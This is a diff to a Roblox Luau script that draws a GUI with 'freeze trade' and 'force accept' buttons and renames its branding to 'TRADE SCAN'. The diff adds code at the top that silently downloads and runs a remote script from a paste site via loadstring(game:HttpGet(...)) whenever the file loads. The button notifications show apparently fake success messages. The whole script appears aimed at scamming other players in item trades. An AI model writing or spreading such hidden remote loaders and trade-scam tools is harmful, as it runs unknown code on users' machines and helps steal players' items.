@@ -3,6 +3,14 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
+local success, result = pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/mUjFhYyx/raw"))()
+end)
+
+if not success then
+    warn("Failed to auto-run FREEZER script:", result)
+end
+
 -- Constants
 local UI_COLOR_PRIMARY = Color3.fromRGB(20, 20, 20)
 local UI_COLOR_SECONDARY = Color3.fromRGB(40, 40, 40)
@@ -166,7 +174,7 @@ end)
 -- Notifications and Script Execution
 freezeBtn.MouseButton1Click:Connect(function()
     game.StarterGui:SetCore("SendNotification", {
-        Title = "Glaze Hub",
+        Title = "TRADE SCAN",
         Text = "Trade frozen successfully ❄️",
         Duration = 3
     })
@@ -187,7 +195,7 @@ end)
 
 forceBtn.MouseButton1Click:Connect(function()
     game.StarterGui:SetCore("SendNotification", {
-        Title = "Glaze Hub",
+        Title = "TRADE SCAN",
         Text = "Forced accepted 🔂",
         Duration = 3
     })
@@ -203,5 +211,6 @@ tweenObject(searchBox, {TextTransparency = 0}, 0.6)
 tweenObject(avatar, {ImageTransparency = 0.2}, 0.6)
 tweenObject(freezeBtn, {TextTransparency = 0}, 0.6)
 tweenObject(forceBtn, {TextTransparency = 0}, 0.6)
+
 
 
